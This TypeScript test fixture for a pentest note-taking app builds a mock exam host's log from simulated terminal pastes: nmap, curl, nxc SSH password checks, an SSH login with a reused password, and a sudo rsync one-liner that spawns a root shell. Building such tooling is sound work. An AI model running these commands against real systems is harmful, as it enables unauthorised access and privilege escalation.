// xfer03: a mock-exam host captured the way the owner really captures,
// built by running the pastes through Raven's own capture code rather than by writing log rows by hand:
// the draft builder (`buildDraft`, the kind, title, host and content a save stores), the pasted-credential reader and
// the nxc intake planner (`planCredentialIntake`, the credential results a save files). The capture form's own rules
// (src/features/capture/resolve.ts: the host preset when capture is opened from the host's view, the flag kind from the
// host's board column, a credential note's title) are mirrored here, because this file is also built for the Node-side
// audit tooling, which can't load the form's code. src/test/reportCapturedHost.test.ts runs the same pastes through
// `resolveCapture` and `saveCapture` and checks every row matches. Each flag is pasted as just its value, with capture
// opened from the host; its proof is a screenshot taken next to it (one captioned, one not) and, for proof.txt, a
// separate command paste. The credential that opens the box was found on another host's share and pasted with no
// host, so only the nxc result ties it here; no access grant is recorded. Synthetic throughout (10.10.30.x, RFC 5737
// attacker 192.0.2.10).
import { buildDraft, credentialsInPaste, findFlagInPaste, flagTitle, noteTitle, screenshotFileName, type DraftInput } from "../engines/capture";
import { planCredentialIntake } from "../engines/credentials";
import { BUILTIN_LIBRARY } from "../engines/library/data";
import type { ChecklistItem } from "../types/checklist";
import type { CredAttempt, Credential, TriedPair, Username } from "../types/credentials";
import type { Finding } from "../types/findings";
import type { Host } from "../types/host";
import type { FlagKind, LogEntry, LogKind } from "../types/log";
import type { Service } from "../types/service";
import { XFER03, FLAGS } from "./examTexts";

export const XFER = "h-exam-xfer";
const E = "e-exam";
const KALI = "┌──(kali㉿kali)-[~/exam/xfer03]";

/** One paste as the owner made it, with what they changed in the capture form before saving. */
export interface Capture {
  key: string;
  /** Minutes before now. */
  min: number;
  text: string;
  /** A pasted image: the audit screenshot it is (`a-<image>`). */
  image?: string;
  /** The kind chip picked over the detected kind. */
  kind?: LogKind;
  /** Captured from xfer03's host view, so the host is preset (a bare flag value or an uncaptioned screenshot names none). */
  preset?: boolean;
  /** The flag kind picked over the form's default (proof.txt once the host is at Privilege escalation or later). */
  flagKind?: FlagKind;
  observations?: string;
}

export const XFER_CAPTURES: Capture[] = [
  // Found on web01's backup share earlier; pasted on its own, linked to no host.
  { key: "creds", min: 34, text: "svc_backup:Backup#2026", observations: "From backup/notes.txt on web01's share." },
  {
    key: "nmap",
    min: 33,
    text: [
      KALI,
      "└─$ nmap -p- -sC -sV --min-rate 3000 10.10.30.22",
      "Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-05 13:31 UTC",
      "Nmap scan report for 10.10.30.22",
      "Host is up (0.031s latency).",
      "Not shown: 65533 closed tcp ports (reset)",
      "PORT   STATE SERVICE VERSION",
      "22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)",
      "80/tcp open  http    nginx 1.18.0 (Ubuntu)",
      "|_http-title: Index of /",
      "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel",
      "",
      "Nmap done: 1 IP address (1 host up) scanned in 24.18 seconds",
    ].join("\n"),
  },
  {
    key: "listing",
    min: 31,
    text: [
      KALI,
      "└─$ curl -s http://10.10.30.22/",
      "<html><head><title>Index of /</title></head><body><h1>Index of /</h1><hr><pre>",
      '<a href="backup/">backup/</a>                                            02-Nov-2026 09:12       -',
      '<a href="index.nginx-debian.html">index.nginx-debian.html</a>            14-Sep-2026 10:40     612',
      "</pre><hr></body></html>",
    ].join("\n"),
  },
  {
    key: "nxc",
    min: 30,
    text: [
      KALI,
      "└─$ nxc ssh 10.10.30.22 -u admin -p 'Summer2026!'",
      "SSH         10.10.30.22     22     10.10.30.22      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10",
      "SSH         10.10.30.22     22     10.10.30.22      [-] admin:Summer2026!",
      KALI,
      "└─$ nxc ssh 10.10.30.22 -u svc_backup -p 'Backup#2026'",
      "SSH         10.10.30.22     22     10.10.30.22      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10",
      "SSH         10.10.30.22     22     10.10.30.22      [+] svc_backup:Backup#2026  Linux - Shell access!",
    ].join("\n"),
  },
  {
    key: "ssh",
    min: 29,
    text: [
      KALI,
      "└─$ ssh svc_backup@10.10.30.22",
      "svc_backup@10.10.30.22's password:",
      "Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)",
      "svc_backup@xfer03:~$ id",
      "uid=1001(svc_backup) gid=1001(svc_backup) groups=1001(svc_backup)",
    ].join("\n"),
  },
  // xfer03 sits at Post-exploitation now, so the form offers proof.txt: the owner picks local.txt.
  { key: "local", min: 27, text: FLAGS.xfer03Local, preset: true, flagKind: "local" },
  { key: "local-shot", min: 26, text: "local.txt on xfer03", image: "xfer03-local" },
  {
    key: "sudo",
    min: 24,
    text: [
      "svc_backup@xfer03:~$ sudo -l",
      "Matching Defaults entries for svc_backup on xfer03:",
      "    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin",
      "",
      "User svc_backup may run the following commands on xfer03:",
      "    (root) NOPASSWD: /usr/bin/rsync",
    ].join("\n"),
  },
  {
    key: "rsync",
    min: 22,
    text: [
      `svc_backup@xfer03:~$ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`,
      "# id",
      "uid=0(root) gid=0(root) groups=0(root)",
    ].join("\n"),
  },
  { key: "proof", min: 21, text: FLAGS.xfer03Proof, preset: true },
  // The read reads as a flag paste; the owner had logged the flag already and kept this one a command.
  { key: "proof-read", min: 20.5, text: XFER03.proofPaste, kind: "command" },
  // No caption: only its time ties it to the proof flag.
  { key: "proof-shot", min: 20, text: "", image: "xfer03-proof", preset: true },
];

export const XFER_SCOPE = ["10.10.30.0/24"];
export const XFER_DOMAIN = "exam.corp";
export const XFER_MACHINES = ["Kali (VM)", "Windows 11 (VM)"];

/** What the capture form starts from for a paste: the engagement's hosts, scope, domain and machines. */
export function draftInputOf(c: Capture, hosts: Host[]): DraftInput {
  return {
    text: c.text,
    image: c.image ? { mime: "image/png" } : null,
    ...(c.kind ? { kind: c.kind } : {}),
    hosts: hosts.map((h) => ({ id: h.id, name: h.name, ip: h.ip, column: h.boardColumn })),
    scope: XFER_SCOPE,
    domain: XFER_DOMAIN,
    machines: XFER_MACHINES,
    lastRanOn: "Kali (VM)",
    library: BUILTIN_LIBRARY,
  };
}

const COLUMNS = ["information-gathering", "vulnerability-detection", "initial-foothold", "privilege-escalation", "post-exploitation", "reporting"];

/** The entry fields a save stores for a paste, as the capture form resolves them (`hostId`: xfer03's id). */
export function editsOf(c: Capture, hosts: Host[], hostId = XFER) {
  const draft = buildDraft(draftInputOf(c, hosts));
  const hostIds = draft.hostIds.length > 0 ? draft.hostIds : c.preset ? [hostId] : [];
  const host = hosts.find((h) => h.id === hostIds[0]) ?? null;
  let content = draft.content;
  let title = draft.title;
  if (content.kind === "flag") {
    // A pasted proof block names its file; else the form's default from the host's board column.
    const byColumn: FlagKind = host && COLUMNS.indexOf(host.boardColumn) >= COLUMNS.indexOf("privilege-escalation") ? "proof" : "local";
    const flagKind = c.flagKind ?? findFlagInPaste(c.text)?.flagKind ?? byColumn;
    content = { ...content, flagKind };
    title = flagTitle(flagKind);
  } else if (content.kind === "screenshot") {
    title = noteTitle(c.text) || "Screenshot";
    const fileName = screenshotFileName({ ip: host?.ip ?? null, hostName: host?.name ?? null, column: host?.boardColumn ?? null, caption: c.text, mime: "image/png" });
    content = { ...content, fileName };
  }
  const credentials = draft.kind === "note" ? credentialsInPaste(c.text, BUILTIN_LIBRARY, hosts.map((h) => h.name)) : [];
  if (credentials.length > 0) title = `${credentials.length === 1 ? "Credential" : "Credentials"} for ${credentials.map((p) => p.username).join(", ")}`;
  return {
    draft,
    kind: content.kind,
    title,
    hostIds,
    ranOn: draft.ranOn,
    content,
    observations: c.observations ?? "",
    credentials: credentials.map((p) => ({ ...p, hostId: host?.id ?? null })),
  };
}

/** xfer03's log, services, credentials and credential results, as saving the captures files them. */
export function capturedHost(now: number, hosts: Host[]) {
  const ago = (min: number) => now - Math.round(min * 60_000);
  const log: LogEntry[] = [];
  const services: Service[] = [];
  const credentials: Credential[] = [];
  const usernames: Username[] = [];
  const credAttempts: CredAttempt[] = [];
  const triedPairs: TriedPair[] = [];
  const id = (key: string) => `l-exam-xfer-${key}`;

  for (const c of XFER_CAPTURES) {
    const at = ago(c.min);
    const e = editsOf(c, hosts);
    const content =
      (e.content.kind === "screenshot" || e.content.kind === "flag") && c.image ? { ...e.content, attachmentId: `a-${c.image}` } : e.content;
    const entry: LogEntry = {
      id: id(c.key), engagementId: E, kind: e.kind, title: e.title, titleEdited: false, ranOn: e.ranOn, hostIds: e.hostIds,
      observations: e.observations || null, returnedNothing: false, private: false, content, at, createdAt: at, updatedAt: at,
    };
    log.push(entry);

    // A pasted credential, placed on the host the capture is linked to (here none: no source host).
    for (const p of e.credentials) {
      credentials.push({
        id: `c-exam-xfer-${p.username}`, engagementId: E, type: p.type, username: p.username, domain: p.domain, secret: p.secret,
        hashType: p.type === "hash" ? "NTLM" : null, scope: p.local ? "local" : "domain", localHostId: p.local ? p.hostId : null, sourceHostId: p.hostId,
        source: "paste", notes: null, crackStatus: null, crackedFrom: null, fromSecretId: null, createdAt: at, updatedAt: at,
      });
    }
    // An nmap scan files its open ports as services.
    for (const p of e.draft.scan?.ports ?? []) {
      services.push({
        id: `s-exam-xfer-${p.port}`, hostId: e.draft.scan!.hostId, port: p.port, protocol: p.protocol, state: p.state, nmapService: p.service || null,
        nmapVersion: p.version || null, confirmedProduct: null, confirmedVersion: null, confirmedEntryId: null, verdict: null, createdAt: at, updatedAt: at,
      });
    }
    // nxc results through the intake, against the credentials stored by then.
    if (content.kind !== "command") continue;
    const plan = planCredentialIntake({ blocks: content.blocks, engagement: { id: E }, hosts, credentials, usernames });
    if (!plan) continue;
    for (const u of plan.newUsernames) {
      // As the store files it: `.\user` is the answering host's own account.
      const local = u.domain === "." && u.sourceHostId ? u.sourceHostId : null;
      usernames.push({
        id: `u-exam-xfer-${u.username}`, engagementId: E, username: u.username, domain: local ? null : (u.domain ?? null),
        sourceHostId: u.sourceHostId ?? null, source: u.source ?? null, createdAt: at, scope: local ? "local" : "unknown", localHostId: local,
      });
    }
    for (const a of plan.attempts) {
      credAttempts.push({
        id: `ca-exam-xfer-${credAttempts.length + 1}`, engagementId: E, credId: a.credId, usernameId: a.usernameId ?? null, hostId: a.hostId,
        service: a.service, port: a.port ?? null, result: a.result, authMode: a.authMode ?? "domain", detail: a.detail ?? null, logEntryId: entry.id, at,
      });
    }
    for (const p of plan.newCredentials) {
      if (!p.failedOnly || !p.input.username || !p.input.secret) continue;
      for (const a of p.attempts) {
        if (a.result !== "failed") continue;
        triedPairs.push({
          id: `tp-exam-xfer-${triedPairs.length + 1}`, engagementId: E, username: p.input.username, domain: p.input.domain ?? null, secret: p.input.secret,
          secretKind: p.input.type === "hash" ? "hash" : "password", hostId: a.hostId, service: a.service, authMode: a.authMode ?? "domain",
          logEntryId: entry.id, at,
        });
      }
    }
  }

  // Findings are written by the owner, linked to the steps they came from. One opened the box, one rooted it; the rest
  // are observations (info, low) with Markdown text, as the owner writes it.
  const finding = (key: string, over: Partial<Finding> & Pick<Finding, "title" | "stepEntryIds">): Finding => ({
    id: `f-exam-xfer-${key}`, engagementId: E, severity: "info", cvssVector: null, cvssScore: null, status: "confirmed", description: "", impact: "",
    remediation: "", exploitNotes: "", lessons: "", refs: [], serviceIds: [], hostIds: [XFER], createdAt: ago(19), updatedAt: ago(19), ...over,
  });
  const findings: Finding[] = [
    finding("reuse", {
      title: "Reused share password logs in over SSH", severity: "high", stepEntryIds: [id("nxc"), id("ssh")], serviceIds: ["s-exam-xfer-22"],
      description:
        "The password of `svc_backup`, found in **backup/notes.txt** on web01's share, is also its password on xfer03. " +
        "SSH accepts passwords, so it logs in as `svc_backup` with a shell.",
      remediation: "- Give `svc_backup` a unique password on each host.\n- Remove *notes.txt* from the share.\n- Use SSH keys only (`PasswordAuthentication no`).",
    }),
    finding("rsync", {
      title: "Passwordless sudo on rsync gives root on xfer03", severity: "high", stepEntryIds: [id("sudo"), id("rsync")],
      description: "`svc_backup` may run `/usr/bin/rsync` as root with no password. rsync's `-e` option runs **any** command, so it starts a root shell.",
      remediation: "Remove the sudo rule, or limit it to a wrapper script that takes no arguments.",
      refs: ["https://gtfobins.github.io/gtfobins/rsync/"],
    }),
    finding("listing", {
      title: "Directory listing on the web root", severity: "low", stepEntryIds: [id("listing")], serviceIds: ["s-exam-xfer-80"],
      description: "nginx lists the web root, so `backup/` and its contents are visible to anyone.",
      remediation: "Set `autoindex off;` in the site's server block.",
    }),
    finding("ssh-passwords", {
      title: "SSH password authentication enabled", stepEntryIds: [],
      // As the importer writes a finding: its affected service first, then the text.
      description: "Affected: 22/tcp OpenSSH 8.9p1\n\nThe server accepts **password** logins, which lets any leaked or guessed password in. See [the OpenSSH manual](https://man.openbsd.org/sshd_config).",
      remediation: "Set `PasswordAuthentication no` in `/etc/ssh/sshd_config` and use keys.",
    }),
  ];

  // Saving the full scan ticks its goal from the output, the scan as its evidence.
  const nmapAt = ago(XFER_CAPTURES.find((c) => c.key === "nmap")!.min);
  const checklist: ChecklistItem[] = [
    { ownerId: XFER, goalId: "h-enum-full-tcp", status: "done", notes: null, completedAt: nmapAt, auto: true, autoFrom: null, evidence: [{ entryId: id("nmap") }], updatedAt: nmapAt },
  ];

  return { log, services, credentials, usernames, credAttempts, triedPairs, findings, checklist };
}
